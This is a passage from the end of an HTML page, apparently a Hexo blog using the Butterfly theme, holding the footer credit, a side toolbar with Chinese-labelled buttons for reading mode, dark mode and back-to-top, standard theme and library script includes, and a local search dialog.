rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
